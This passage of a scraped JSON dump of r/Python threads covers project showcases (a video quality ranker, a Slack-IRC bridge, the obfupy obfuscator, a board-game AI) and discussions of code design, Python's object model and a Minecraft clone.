    "post_content": "What my project does\nRanks videos based on overall quality. Takes into account multiple metrics to determine what quality is the best.\nTarget audience\nHome users / Video enthusiasts\nComparison\nThis project uses the following metrics to rank videos:\nResolution: Higher resolution videos are preferred.\nFrame Rate: Videos with higher frame rates are ranked higher.\nBitrate: Higher bitrate often indicates better quality.\nCodec: Some codecs provide better quality than others at the same bitrate.\nThe script extracts these metrics using ffprobe from the FFmpeg suite and sorts the videos accordingly. Here's how the metrics are used:\nResolution: The script first compares the resolution (width x height) of the videos. Higher resolutions are ranked higher.\nFrame Rate: If two videos have the same resolution, the one with the higher frame rate is ranked higher.\nBitrate: For videos with the same resolution and frame rate, the bitrate is used to determine the quality.\nCodec: In case of a tie in all other metrics, the codec is considered to break the tie.\nAccess the Script\nYou can access the script on GitHub here",
    "comments": [
        {
            "author": "athermop",
            "score": "2",
            "content": "PSNR, SSIM and friends are important tools to include in video quality ranking.",
            "replies": [
                {
                    "author": "SAV_NC",
                    "score": "1",
                    "content": "what kind of command line would you implement using these tools?"
                }
            ]
        }
    ]
},
{
    "post_author": "bolt_runner",
    "post_id": "1dkrfgh",
    "post_score": "237",
    "post_time": "Friday, June 21, 2024 at 3:52:48 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Open source Python projects with good software design that is worth studying",
    "media": [],
    "post_content": "What are some software projects written in python that are well-structured and use good code design practices that are worth spending time to study?",
    "comments": [
        {
            "author": "Penny-loafers",
            "score": "129",
            "content": "I've had similar thoughts during my career - wanting to read others code so I can get a good idea of how they work and how I can learn to replicate. Its not a bad thought, and I'd highly encourage doing it even if the mature projects you know about are very well established and hard to follow/understand. One thing I'd encourage is for you to also look back in history of the commits and code bases. It can be hard sometimes to understand how code evolves over time, but its very important. For example, I just started using this new open source python project for my home security camera setup (https://github.com/blakeblackshear/frigate) and I was hugely impressed with how many features there are given its made by a hobbyist! I decided to look back in the commit history and saw the very first, humble, and honest commit \"was just\" a script to detect objects: https://github.com/blakeblackshear/frigate/blob/72393be6d66e7642343476f5adb4b8e99d613c79/detect_objects.py I hope this little bit of advice is useful and good luck with learning! The hard work will pay off!",
            "replies": [
                {
                    "author": "Responsible_Ease_977",
                    "score": "3",
                    "content": "Thank for sharing!"
                },
                {
                    "author": "DarkArctic",
                    "score": "2",
                    "content": "I think this is an important point. Well-designed projects probably have years of iteration to get to that point. It's okay to make mistakes and change it later. That's just the nature of software development."
                },
                {
                    "author": "bolt_runner",
                    "score": "3",
                    "content": "Thank you this is helpful Did you study any books/resources on code design that you think helped you practically afterwards?",
                    "replies": [
                        {
                            "author": "Penny-loafers",
                            "score": "39",
                            "content": "There were a few books I did enjoy studying that helped frame my thinking. That said, take everything you read with a grain of salt and try think about how they relate to your problem at hand. Try different paradigms and patterns in your own time and write as much code as possible along with studying generic resources. Fluent Python Philosophy of Software Design Designing Data Intensive Applications"
                        }
                    ]
                }
            ]
        },
        {
            "author": "tynecastleza",
            "score": "16",
            "content": "You should go look through Mozilla’s GitHub. There are a lot of Python projects from some really great engineers"
        },
        {
            "author": "antshatepants",
            "score": "12",
            "content": "I always liked the get_or_create and filter methods in Django so I studied those at one point to make a lightweight ORM interface for different backing datastores. Haven’t compared to other codebases to say if it’s “good” or not but the source code was readable and not buried in tiers of abstractions"
        },
        {
            "author": "Mehdi2277",
            "score": "22",
            "content": "I like both mypy and pylint codebases. Both are readable enough I’ve occasionally made small bug fixes and both have pretty high quality test suites. Tensorflow is less good codebase to learn from but still has ok structure and it is massive and more complicated than many codebases I interact with at work."
        },
        {
            "author": "swapripper",
            "score": "9",
            "content": "On this note, is there any website/youtube channel that explains these high level & low level decisions in open source projects. I really think it takes a trained eye can spot & explain good SW design to beginners."
        },
        {
            "author": "robberviet",
            "score": "25",
            "content": "Sqlalchemy",
            "replies": [
                {
                    "author": "FertilityHollis",
                    "score": "10",
                    "content": "Excellent example of how to grow an API. I would also point to Django as something to strive for."
                }
            ]
        },
        {
            "author": "qckpckt",
            "score": "29",
            "content": "Sebastian Ramirez (https://tiangolo.com). He created FastAPI and Typer. I really like both of these libraries. I think the docs are well laid out, and I think his programming idioms are both innovative and effective. Typer I especially like because it’s mostly just click - but what it does on top creates a much more intuitive programming interface (at least for me)."
        },
        {
            "author": "ShibbolethMegadeth",
            "score": "3",
            "content": "Taiga is a excellent Django app written by pros if you wanna check out a web backend"
        },
        {
            "author": "DigThatData",
            "score": "12",
            "content": "we already had this discussion -- with you as the OP -- a few days ago. 83 points and 33 comments. Do we really need to do this again so soon? https://www.reddit.com/r/learnpython/comments/1dicifq/open_source_python_projects_with_good_software/",
            "replies": [
                {
                    "author": "bolt_runner",
                    "score": "17",
                    "content": "Yes I asked here because this sub has more people with senior lvl experience so it would add value and another perspective to the discussion on code design, and it shows in the answers"
                }
            ]
        },
        {
            "author": "CanadianBuddha",
            "score": "6",
            "content": "The source code for the packages that are part of the Python standard library were considered so good they were included in the standard library. They should be good examples of excellent Python code."
        },
        {
            "author": "RobotChurchill",
            "score": "3",
            "content": "First, you can take a look at 500 Lines or Less https://github.com/aosabook/500lines For large projects, Ray https://github.com/ray-project/ray is really good. I got to meet one of the engineers working at the company that made it open sourced."
        },
        {
            "author": "chiefnoah",
            "score": "2",
            "content": "Maybe a bit conceited, but I'll plug my own data library PyBARE. It's small, fairly well tested, and uses pretty much every advanced metaprogramming technique available in Python short of eval."
        },
        {
            "author": "ez1_",
            "score": "2",
            "content": "I think a good choice is apache superset. The domain is interesting and easy to understand so you can focus studying the design and implementation. The documentation is quite good. https://github.com/apache/superset"
        },
        {
            "author": "MeroLegend4",
            "score": "2",
            "content": "Sqlalchemy Pyramid web framework psycopg pyqt/qt c++ litestar (api/web framework) bottle sortedcontainers more-itertools (not related to software design but good material) xlsxwriter (on how to keep and maintain a spec, very functional (fp))",
            "replies": [
                {
                    "author": "MeroLegend4",
                    "score": "2",
                    "content": "I just remembered others: bokeh twisted pygal diskcache"
                }
            ]
        },
        {
            "author": "trd1073",
            "score": "1",
            "content": "I am admittedly not a python expert but will give you the one that helped me the most. My initial foray into python was studying how map-a-droid runs. Then I learned how to mod it to suit my purposes. Ran it over 4 years, so got to see a fair amount of evolution. It touches on many subjects that have helped me in my current projects: asyncio, multiprocessing, mariadb, caching, redis, inter process communication and so on."
        },
        {
            "author": "not_perfect_yet",
            "score": "1",
            "content": "flask? https://github.com/pallets/flask Has 2 open issues and 2 open PRs."
        }
    ]
},
{
    "post_author": "Asryk",
    "post_id": "hrvxrd",
    "post_score": "3865",
    "post_time": "Wednesday, July 15, 2020 at 11:57:02 PM GMT+3",
    "flair_text": "Meta",
    "post_title": "Python in a nutshell (Had to do it)",
    "media": [
        "https://i.redd.it/o5fhi4uw33b51.jpg",
        "https://preview.redd.it/o5fhi4uw33b51.jpg?width=640&crop=smart&auto=webp&s=acb97dfcab307682eb88bbc95cc758b08384ed99"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "B1GL0NGJ0HN",
            "score": "275",
            "content": "Love this one, mainly because that's exactly how I explained it to a friend who I introduced to python. It's just objects, everything's an object, all the way down. It took a while, but he cooked the noodle, and made strides."
        },
        {
            "author": "Chinpanze",
            "score": "60",
            "content": "As someone who learned only python, how it would NOT be this way?"
        },
        {
            "author": "AlSweigart",
            "score": "124",
            "content": "In Python, everything is an object. All objects have a data type. The integer object 42 has a type, the int type: >>> type(42) <class 'int'> The return value from the type() function is also an object. It's data type is the type type: >>> type(type(42)) <class 'type'> EDIT: Also, there's no distinction between \"primitive types\" and \"object types\" in Python: they're all objects. Integers and bools are objects. When you type 42 into your source code, we call that a literal (it's an object you are literally typing into your source code). But that literal refers to an object that the Python interpreter creates. You can call id(42) and it returns the id of that integer object. None of this matters for 99% of Python programming. You can go years as a professional Python developer and not know this stuff. I did. But if you want to learn this stuff, I highly recommend reading Fluent Python."
        },
        {
            "author": "ForceBru",
            "score": "21",
            "content": "Also, the type of type is type itself, so everything is an object, indeed, even type itself."
        },
        {
            "author": "ChocolateBunny",
            "score": "19",
            "content": "You think Python is all objects? You should take a gander at SmallTalk. Their for loops and if statements are also objects. Their arithmetic doesn't follow BEDMAS because changing the order of operations messes with their object oriented design."
        },
        {
            "author": "discobrisco",
            "score": "43",
            "content": "Put a python logo over the earth and you’ll have a winner"
        },
        {
            "author": "suki907",
            "score": "12",
            "content": "To make an object callable, add a __call__ method. Functions and methods, including __call__, have a have a __call__ method. That's what makes them callable. f.__call__.__call__.__call__.__call__"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "*laughs in java*"
        },
        {
            "author": "toyg",
            "score": "3",
            "content": "That’s not strictly true, particularly when you get a bit deeper in the bowels of dunder methods and other “magic”. CPython pulls some very dirty tricks behind the scenes. But it’s true that the projects strives to provide a user experience very faithful to OOP principles. Arguably, Ruby and particulary Smalltalk (the “original” OOP language) have purer implementations where everything really is an object. They pay for it in performance."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dpdhpn",
    "post_score": "7",
    "post_time": "Thursday, June 27, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "ghurlag",
            "score": "3",
            "content": "I currently work in IT as a Linux Systems Engineer. I spend a lot of time in Red Hat products, such as RHEL and Ansible Automation Platform, both of which employ Python. I hold an Associate's Degree that was programming heavy (Visual Basic, C++, Java), and a Bachelor's Degree that included a couple intro-level Python courses. I'd like to expand into Python to open up some opportunities along the lines of Infrastructure Automation or perhaps even Data Engineering. So my question(s): 1. What Python courses would one recommend for someone with a coding background? 2. Are there any certifications that are worth pursuing? I've found some resources for PCEP and PCAP, and was wondering if they would do anything to lend some level of credibility to Python qualification. If certifications are not worth it, would pursuing a Masters Degree in Data Analytics or something similar (e.g. https://www.wgu.edu/online-it-degrees/data-analytics-masters-program.html ) be of any use?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dsfboc",
    "post_score": "7",
    "post_time": "Monday, July 1, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "muditjps",
    "post_id": "1dl7c60",
    "post_score": "8",
    "post_time": "Friday, June 21, 2024 at 6:54:42 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Log Monitoring with Kafka ETL using Python via Docker and Pathway",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://pathway.com/developers/templates/kafka-etl",
        "https://github.com/pathwaycom/pathway/tree/main/examples/projects/kafka-ETL"
    ],
    "post_content": "Hi r/Python,\nThis project is for a Streaming ETL problem statement for Fraud-detection/Log Monitoring use-case.\nHere's a link to the blog explainer: https://pathway.com/developers/templates/kafka-etl\nGitHub Repo link: https://github.com/pathwaycom/pathway/tree/main/examples/projects/kafka-ETL\nWhat the Project Does\nLet's say we're monitoring logs from servers in New York and Paris. The logs have different time zones so you need to unify these different time zones into a single format to maintain data integrity. Now, Kafka is a popular ETL tool but it's usable only in Java/Scala.\nTarget Audience\nThis is mostly for Python developers/data scientists/ML engineers and people who work on Fraud Detection or ETL.\nComparison\nThis project leverages Pathway, a Python ETL framework powered by an underlying Rust engine that surpasses Flink/Kafka in benchmarks. With this Pythonic framework we:\nExtract data streams from Kafka using built-in Kafka input connectors.\nConvert times with varying time zones into unified timestamps the datetime module.\nLoad the final data stream back into Kafka.\nThe entire script is available as an app template on the repo, which can be run via Docker in minutes. Open to your feedback/questions!",
    "comments": [
        {
            "author": "ARRgentum",
            "score": "2",
            "content": "Your example under \"What the Project Does\" confuses me - wouldn't the \"obvious\" solution be to standardize logs to UTC / ISO 8601 ?",
            "replies": [
                {
                    "author": "muditjps",
                    "score": "1",
                    "content": "Hey u/ARRgentum, this example illustrates timestamp harmonization with a Python user defined function (UDF) applied to each stream separately, then merging the two streams and reordering timestamps. In the vanilla case where only a simple timezone conversion to UTC is needed, your approach works and the UDF is just the one-liner shown in the example. If you need a more complex UDF (e.g. to fix human induced typos) that's possible to using the illustrated method."
                }
            ]
        }
    ]
},
{
    "post_author": "Gerold55",
    "post_id": "1dt4ang",
    "post_score": "0",
    "post_time": "Tuesday, July 2, 2024 at 12:14:50 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Minecraft using python",
    "media": [
        "https://github.com/Gerold55/PyCraft"
    ],
    "post_content": "I'm working on making minecraft in python but the game is definitely slow and am wondering if it's even possible? https://github.com/Gerold55/PyCraft",
    "comments": [
        {
            "author": "the_hoser",
            "score": "13",
            "content": "It's possible. You're going to have to make heavy use of ctypes to work with OpenGL or Vulkan. Performance is going to be an issue. I recommend looking into Cython to write the performance-sensitive sections of code. Is it the best way to go about making a Minecraft clone? Probably not. It's certainly possible, though."
        },
        {
            "author": "denehoffman",
            "score": "3",
            "content": "It’s possible but you’re going to need a lot of cython (or maybe rust, for the daring) code to make it performant. Python doesn’t have great ways of processing in parallel on gpus, not a ton of shader support, and the GIL makes it very impractical to do most of the things Minecraft would require, so you’ll end up writing the game in C and using Python as the API in the end anyway."
        },
        {
            "author": "pythonwiz",
            "score": "3",
            "content": "It is possible but it will be hard to match the performance of Java. Try to make a simple clone and not match every feature. Start with very basic goals and go from there. I'd recommend looking into PyOpenGL and PyGame."
        },
        {
            "author": "fortunatefaileur",
            "score": "6",
            "content": "It’s not really sensible to write a 3d game engine in Python even with numpy.",
            "replies": [
                {
                    "author": "cpadev",
                    "score": "4",
                    "content": "I don’t think it’s supposed to be sensible or reasonable, just fun."
                }
            ]
        },
        {
            "author": "Gerold55",
            "score": "2",
            "content": "To all who commented am not trying to do infinite worlds or to have 500 items in the game... this is something fun to see how far I can take it"
        },
        {
            "author": "baekalfen",
            "score": "1",
            "content": "Try PyPy and see how much that helps. It’s an alternative to the normal interpreter which “Just In Time” compile your code"
        },
        {
            "author": "Latter_Reflection899",
            "score": "1",
            "content": "before starting a project always search github for a similar project, a few people have tried this before"
        },
        {
            "author": "KrazyKirby99999",
            "score": "-3",
            "content": "Set your needed dependencies using requirements.txt or pyproject.toml and use a virtual environment",
            "replies": [
                {
                    "author": "Gerold55",
                    "score": "2",
                    "content": "I've added that to the game's repo"
                }
            ]
        }
    ]
},
{
    "post_author": "sonobanana33",
    "post_id": "1dl064e",
    "post_score": "11",
    "post_time": "Friday, June 21, 2024 at 12:48:47 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "localslackirc - bridge slack and IRC",
    "media": [
        "https://github.com/ltworf/localslackirc",
        "https://codeberg.org/ltworf/localslackirc"
    ],
    "post_content": "I made a minor bugfix release of localslackirc\nhttps://codeberg.org/ltworf/localslackirc\nIt can be installed via apt or ran from sources. No pypi package, sorry.\nWhat My Project Does\nAfter configuring it with a token from slack, it creates a local IRC server that bridges with slack.\nIt supports threads, sending files. It doesn't support reactions.\nIt supports muting @here notifications from certain users or certain channels.\nIt allows to silently leave a channel, but rejoins it if the user is personally mentioned there.\nTarget Audience\nMostly people who have to use slack for work and would prefer IRC.\nComparison\nI am not aware of a project doing the same thing. I know weechat has a slack plugin, but that's slightly different. I don't use weechat and I wanted to keep using my IRC client.\nout of date link to avoid the post from being removed: https://github.com/ltworf/localslackirc",
    "comments": [
        {
            "author": "fellipec",
            "score": "13",
            "content": "Relevant XKCD"
        }
    ]
},
{
    "post_author": "wqking",
    "post_id": "1dq8qfy",
    "post_score": "0",
    "post_time": "Friday, June 28, 2024 at 5:20:38 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "obfupy -- Python source code obfuscator aiming to produce correct and functional code",
    "media": [
        "https://github.com/wqking/obfupy"
    ],
    "post_content": "https://github.com/wqking/obfupy\nFor those who downvotes the post and my comments, please read the subreddit rule 9, \"Please don't downvote without commenting your reasoning for doing so\". Also you not need such library doesn't mean the library is bad, if you don't like it, just leave. If you downvote, please comment with the reason.\nWhat My Project Does\nobfupy is a Python 3 library that can obfuscate entire Python 3 projects, transforming source code into obfuscated and difficult-to-understand code. obfupy aims to produce correct and functional code. Several non-trivial real-world projects were tested using obfupy, such as Flask, Nodezator, Algorithms collection, and Django (not all features are enabled for Django).\nTarget Audience\nThe goal is to obfuscate your production code.\nComparison\nobfupy supports several features that no other similar projects support all. obfupy is tested with Flask, Nodezator, Algorithms collection, and even Django. obfupy is very customizable. obfupy code is well written, well designed and scalable, it's not any single file project which is not scalable or readable. obfupy will not be abandoned unless nobody uses it, very few other projects are not abandoned. obfupy is well documented, there even lists the problem situation where the obfuscation feature doesn't work.\nFacts and features\nObfuscation methods\nRewrite the \"if\" conditional to include many confusing branches.\nRename local variable names.\nExtract the function and have the original function call the extracted function, then rename the parameters in the extracted function.\nCreate alias for function arguments.\nObfuscate numeric and string constants and replace them with random variable names.\nReplace built-in function names (e.g. \"print\") with random variable names.\nAdd useless control flow to for and while.\nRemove doc strings.\nRemove comments.\nAdd extra spaces around operators.\nMake indents larger to make it harder to read.\nAdd extra blank lines between code lines.\nEncode the whole Python source file with base64, zip, bz2, byte obfuscator, and easy to add your own codec.\nCustomizable\nThere are multiple layers of independent transformers. You can choose which transformers to use and which not to use.\nThe non-trivial transformers such as Rewriter, Formatter, support comprehensive options to enable/disable features. If any feature doesn't work well for your project, you can just disable it.\nWell tested\nThere are tests that cover all features.\nTested with several real world non-trivial projects such as Flask, Nodezator, Algorithms collection, and Django.\nLicense\nApache License, Version 2.0\nQuick start\nA typical Python script using obfupy looks like,\nimport obfupy.documentmanager as documentmanager\nimport obfupy.util as util\nimport obfupy.transformers.rewriter as rewriter\nimport obfupy.transformers.formatter as formatter\n\ninputPath = PATH_TO_THE_SOURCE_CODE\noutputPath = PATH_TO_OUTPUT\n\n# Prepare source code files as DocumentManager\nfileList = util.findFiles(inputPath)\ndocumentManager = documentmanager.DocumentManager()\ndocumentManager.addDocument(util.loadDocumentsFromFiles(fileList))\n\n# Transform the source code with various transformers\n\n# Transformer Rewriter\nrewriter.Rewriter().transform(documentManager)\n# Transformer Formatter\nformatter.Formatter().transform(documentManager)\n# There are other transformers\n\n# Write the obfuscated code to outputPath\nutil.writeOutputFiles(documentManager, inputPath, outputPath)",
    "comments": [
        {
            "author": "mattl33",
            "score": "98",
            "content": "Burn this with fire. If you want to hide your source make it an API, but not this."
        },
        {
            "author": "zalatik",
            "score": "49",
            "content": "/s Just write the code in Perl. No need to obfuscate.",
            "replies": [
                {
                    "author": "kissekattutanhatt",
                    "score": "4",
                    "content": "Haha, this made me laugh out loud like some maniac.",
                    "replies": [
                        {
                            "author": "thadeshammer",
                            "score": "3",
                            "content": "Perl does have that effect on people."
                        }
                    ]
                }
            ]
        },
        {
            "author": "DuckDatum",
            "score": "11",
            "content": "What stops someone from reviewing your source code to create a new library: unobfupy ?"
        },
        {
            "author": "divad1196",
            "score": "30",
            "content": "From the methods, it seems obvious that it will slow down your code. For the function call method, why not just remap the parameters at thr beginning of the function instead of doing this extraction thing? For the rest like \"extra empty lines\", \"bigger indent\", ... this is a bit ridiculous as it takes 1 regex to revert it. Extra parenthesis around operators is also useless. Variable renaming, additional control flow, ... are real methods, but if you ever use ghidra, you know that it is not enough. I understand what the idea is that in compiled programs and javascript, you can obfuscate your code. This is less an issue for them since they are already compiled into something not human-friendly. This idea of obfuscation is to prevent people to steal your code or find security vulnerabilities(but blackboy security isn't good, so the only valid point IMO is intellectual property) So, this is useful when handing your code to someone else. As someone mentionned, if you don't want your code to be at risk, do an API and never give your code."
        },
        {
            "author": "GnuhGnoud",
            "score": "9",
            "content": "I made one as well, but just for fun. It can be easily converted back to original code. https://dthung1602.github.io/pyobfusinator/"
        },
        {
            "author": "ZiKyooc",
            "score": "7",
            "content": "There are tools to facilitate reverse engineering of compiled code. Not an area I follow, but with AI I am pretty sure that making a tool to de-obfuscate would be relatively easy.",
            "replies": [
                {
                    "author": "Asalanlir",
                    "score": "5",
                    "content": "It is, and you don't really need any \"AI\" 99% of the time. A lot of these things a decent compiler will automatically recognize and rewrite for you (e.g. convoluted control flow). And the variable renaming thing is simple: just don't look at the user-vars. You could argue those tools operate on *compiled* code, which python code is not (kind of, but this isn't the place for that). But we have the logic, and its *really* good at it even as just rule based logic and parsing. In terms of actual production/industry value, this approach just isn't it. But it's an interesting project imo and could help teach concepts related to compiling and control flow."
                }
            ]
        },
        {
            "author": "snekk420",
            "score": "38",
            "content": "No reason to use this unless your source code is malware"
        },
        {
            "author": "CollinHeist",
            "score": "5",
            "content": "Looks cool - nice job. A few suggestions: Add some examples of before/after obfuscation. Generally, I find that docs in README files or wiki’s relatively hard to maintain and limiting. Perhaps set up mkdocs or read the docs site Add type annotations if the code is meant to be used from within Python and not via a CLI"
        },
        {
            "author": "davebaker824",
            "score": "17",
            "content": "This basically mocks the spirit of open-source software, such as Python itself. It’s offensive."
        }
    ]
},
{
    "post_author": "toastyCSboi",
    "post_id": "er9q4h",
    "post_score": "3862",
    "post_time": "Monday, January 20, 2020 at 10:05:04 AM GMT+3",
    "flair_text": "",
    "post_title": "I wrote a Python program to play Google Dinosaur Game using Gesture Recognition",
    "media": [
        "https://external-preview.redd.it/YrnSo--Kgm1xpCwTtDp5cqZyWcelftBL31_ERdWdUl0.png?width=640&crop=smart&format=pjpg&auto=webp&s=03bcd833725ba715f9e8da1d60d0c62baf8178b7"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "toastyCSboi",
            "score": "68",
            "content": "Link to Github repository: https://github.com/Kshitij05/GestureRecognitionHackEd2020?files=1 (The final code is in ClenchRex.py)",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "2",
                    "content": "I don't think its connected. He's just taking a video through his phone",
                    "replies": [
                        {
                            "author": "mingping101",
                            "score": "15",
                            "content": "I don't think its connected. He's just taking a video through his phone"
                        },
                        {
                            "author": "shaburushaburu",
                            "score": "2",
                            "content": "You can connect phone to the laptop using droidcam through WiFi and also through USB (need USB bugging to be turned on by going into the Android developer settings) And then changing the videocapture(0) to videocapture (1) in the python code cv2.VideoCapture( variable ) Where variable can be 0 for webcam 1 for external cam and a direct file path like (\"E:\\video.mp4\")"
                        },
                        {
                            "author": "Java_Ethio",
                            "score": "1",
                            "content": "His pc has a camera, the phone is to show us it is real"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Changer_",
            "score": "150",
            "content": "cool, you could expand by making a handsign to voice for deaf people",
            "replies": [
                {
                    "author": "toastyCSboi",
                    "score": "101",
                    "content": "Absolutely! That was actually my initial idea (for a hackathon). Though I ended up making this. I'll totally be working on that!"
                },
                {
                    "author": "mfitzp",
                    "score": "114",
                    "content": "That's quite an \"expansion\". \"Hey I made flappy bird\" \"You could expand it by building an aircraft.\""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "37",
            "content": "Could you please share the code? Or briefly explain how you did it?"
        }
    ]
},
{
    "post_author": "abhi9u",
    "post_id": "1dowa49",
    "post_score": "16",
    "post_time": "Wednesday, June 26, 2024 at 2:27:43 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Looking Under the Hood of Python's Set Data Structure",
    "media": [
        "https://blog.codingconfessions.com/p/cpython-set-implementation"
    ],
    "post_content": "This article dissects how Python implements the Set data structure. It covers a background on hash tables along with implementation of the key Set APIs: insertion, contains, removal and pop. A good way to learn how hash tables are implemented for real-world use cases.\nhttps://blog.codingconfessions.com/p/cpython-set-implementation",
    "comments": [
        {
            "author": "Fluid_Willow_8758",
            "score": "0",
            "content": "This article sounds like a valuable resource for anyone interested in understanding how hash tables and the Set data structure are implemented in Python. By delving into the background of hash tables and providing a detailed exploration of key Set APIs such as insertion, containment checks, removal, and pop operations, the article offers practical insights into real-world applications of these data structures. Understanding the implementation details of hash tables is crucial for developing efficient algorithms and choosing appropriate data structures for specific tasks. It allows developers to grasp the underlying mechanisms that enable fast retrieval, insertion, and deletion of elements in Sets, which are fundamental operations in many computational tasks."
        }
    ]
},
{
    "post_author": "randBrownGuy",
    "post_id": "gjlcyp",
    "post_score": "3853",
    "post_time": "Thursday, May 14, 2020 at 3:26:00 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made an AI opponent for lesser known board game - Chain Reaction. Apparently, it plays better than me!",
    "media": [
        "https://external-preview.redd.it/I_CAtCG7kyj8U20kVxj4J5BaT9mKqg6ruxZHVoJ8Eq8.png?format=pjpg&auto=webp&s=32c2c113aef00cb532da7695bf3f906104cc2d09"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "randBrownGuy",
            "score": "222",
            "content": "Get the source code at: https://github.com/shridharrhegde/chain-reaction-ai",
            "replies": [
                {
                    "author": "GeekFreak404",
                    "score": "84",
                    "content": "Hey i just got done with basic-ish python. Can you please guide me as to what more knowledge do i need to build such stuff?",
                    "replies": [
                        {
                            "author": "randBrownGuy",
                            "score": "164",
                            "content": "I'm just an amateur, but if you'd ask me, the first step would be to assess if you COULD do a task. If the answer is yes, you could go on. My approach is to pick up a cool project to do, and gain relevant knowledge on the go."
                        },
                        {
                            "author": "cleverfool11",
                            "score": "10",
                            "content": "As others have mentioned, learn by doing and figuring your way around roadblocks is awesome. Sometimes I'm stuck for an hour on the same problem, take a little break and sit down with the solution. These moments are awesome and worth the struggle. At times its better to step away and let your brain relax. Also sometimes you struggle down the wrong path and its hard to change direction, stepping away helps with that. Keep a little notebook and write down the problems you have and how to solve them when you figure it out. Also write down the ways that didnt work. I think I learn more by looking at the things that didnt work. When you run into the problem again its easier to recognize and you have a reference in your little notebook that refreshes your memory."
                        },
                        {
                            "author": "haddock420",
                            "score": "6",
                            "content": "The main search algorithm is called minimax. https://www.chessprogramming.org/Minimax That article is geared towards using it for chess but it can be used for a lot of board games."
                        },
                        {
                            "author": "sivadneb",
                            "score": "2",
                            "content": "The best way to learn is by doing. Google \"how to make a game in Python\". Find a tutorial. Start small and simple. Keep iterating and improving."
                        },
                        {
                            "author": "davethegamer",
                            "score": "6",
                            "content": "If you only have the beginnings of a basic understanding it is safe to say just focus on increasing your general knowledge and understanding of the language first. Creating these types of programs comes much later."
                        }
                    ]
                },
                {
                    "author": "Heco1331",
                    "score": "4",
                    "content": "Great job, I'd like to have a look at how you've coded the AI. Which is the specific file for it from the Git? Thanks!",
                    "replies": [
                        {
                            "author": "randBrownGuy",
                            "score": "4",
                            "content": "Python files can be found in core/backends/python If you wanted C, look inside csource/src"
                        }
                    ]
                },
                {
                    "author": "GickRick",
                    "score": "2",
                    "content": "Lovely!!!"
                },
                {
                    "author": "[deleted]",
                    "score": "2",
                    "content": "Thanks!"
                }
            ]
        },
        {
            "author": "haddock420",
            "score": "82",
            "content": "I assumed this would be a minimax search. I just looked at your source and it seems you have modes for both minimax and MCTS. Very impressive!",
            "replies": [
                {
                    "author": "randBrownGuy",
                    "score": "48",
                    "content": "I even wanted to add Deep NNs to MCTS for rollout prediction (i.e., IBM Deep Blue). But when I played with naive minimax with 4 plies lookahead, I knew I could never win with it. So, I guess I am abandoning overkill ideas."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "21",
            "content": "Wow, it looks amazing! Did you make GUI too?",
            "replies": [
                {
                    "author": "randBrownGuy",
                    "score": "27",
                    "content": "Yep, initially I wanted to try out some beautiful shaders with pyopengl or sdl. Then I found out what I wanted to accomplish was much easier with simple sprites in pygame, so I guess that's about it."
                }
            ]
        }
    ]
},
{
    "post_author": "sonobanana33",
    "post_id": "1dl064e",
    "post_score": "11",
    "post_time": "Friday, June 21, 2024 at 12:48:47 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "localslackirc - bridge slack and IRC",
    "media": [
        "https://github.com/ltworf/localslackirc",
        "https://codeberg.org/ltworf/localslackirc"
    ],
    "post_content": "I made a minor bugfix release of localslackirc\nhttps://codeberg.org/ltworf/localslackirc\nIt can be installed via apt or ran from sources. No pypi package, sorry.\nWhat My Project Does\nAfter configuring it with a token from slack, it creates a local IRC server that bridges with slack.\nIt supports threads, sending files. It doesn't support reactions.\nIt supports muting @here notifications from certain users or certain channels.\nIt allows to silently leave a channel, but rejoins it if the user is personally mentioned there.\nTarget Audience\nMostly people who have to use slack for work and would prefer IRC.\nComparison\nI am not aware of a project doing the same thing. I know weechat has a slack plugin, but that's slightly different. I don't use weechat and I wanted to keep using my IRC client.\nout of date link to avoid the post from being removed: https://github.com/ltworf/localslackirc",
    "comments": [
        {
            "author": "fellipec",
            "score": "13",
            "content": "Relevant XKCD"
        }
    ]
},
{
    "post_author": "SAV_NC",
    "post_id": "1dk0ru7",
    "post_score": "1",
    "post_time": "Thursday, June 20, 2024 at 5:21:20 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Video Quality Ranker",
    "media": [
        "https://github.com/slyfox1186/script-repo/blob/115b8d2f038c22ec5b5ea9b85ae87287106e90b8/Bash/Installer%20Scripts/FFmpeg/run-scripts/video-quality-ranker.py"
    ],
    "post_content": "What my project does\nRanks videos based on overall quality. Takes into account multiple metrics to determine what quality is the best.\nTarget audience\nHome users / Video enthusiasts\nComparison\nThis project uses the following metrics to rank videos:\nResolution: Higher resolution videos are preferred.\nFrame Rate: Videos with higher frame rates are ranked higher.\nBitrate: Higher bitrate often indicates better quality.\nCodec: Some codecs provide better quality than others at the same bitrate.\nThe script extracts these metrics using ffprobe from the FFmpeg suite and sorts the videos accordingly. Here's how the metrics are used:\nResolution: The script first compares the resolution (width x height) of the videos. Higher resolutions are ranked higher.\nFrame Rate: If two videos have the same resolution, the one with the higher frame rate is ranked higher.\nBitrate: For videos with the same resolution and frame rate, the bitrate is used to determine the quality.\nCodec: In case of a tie in all other metrics, the codec is considered to break the tie.\nAccess the Script\nYou can access the script on GitHub here",
    "comments": [
        {
            "author": "athermop",
            "score": "2",
            "content": "PSNR, SSIM and friends are important tools to include in video quality ranking.",
            "replies": [
